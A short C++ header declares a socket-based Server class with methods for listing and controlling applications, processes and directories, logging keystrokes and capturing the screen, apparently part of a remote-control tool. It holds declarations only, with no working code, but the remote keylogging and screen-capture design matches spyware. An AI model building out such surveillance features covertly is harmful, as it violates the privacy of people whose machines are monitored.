#pragma once 

#include "../Library.h"

class Server {
private:       
    SOCKET ListenSocket;
    SOCKET ClientSocket;
    std::string ClientIP;

public:
    Server();

    ~Server();

public:
    void Start();

    void Process(char* request, char* data);

    void ListApp();

    void StartApp(std::string name);

    void StopApp(std::string name);

    void ListProcess();

    void ListDirectory(std::string path);

    void KeyLog();

    void CaptureScreen();
};